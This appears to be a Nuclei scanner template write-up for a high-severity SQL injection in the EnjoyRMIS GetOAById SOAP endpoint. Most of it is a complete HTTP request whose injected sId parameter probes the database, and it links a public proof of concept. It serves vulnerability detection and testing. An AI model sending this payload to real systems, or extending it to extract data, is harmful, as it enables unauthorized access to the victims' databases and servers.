# Nuclei Template: EnjoyRMIS - SQL Injection
**Template ID:** enjoyrmis-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`enjoyrmis-sqli.yaml`)

## Vulnerability Information & PoC

## Description
EnjoyRMIS GetOAById has a SQL injection vulnerability, through which an attacker can obtain sensitive database information and even control the server.

## Steps to reproduce / Exploit Payload
```http
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetOAById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOAById xmlns="http://tempuri.org/">
      <sId>string' AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'OFyo'='OFyo</sId>
    </GetOAById>
  </soap:Body>
</soap:Envelope>
```

## References
- https://github.com/wy876/POC/blob/main/EnjoyRMIS-GetOAById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
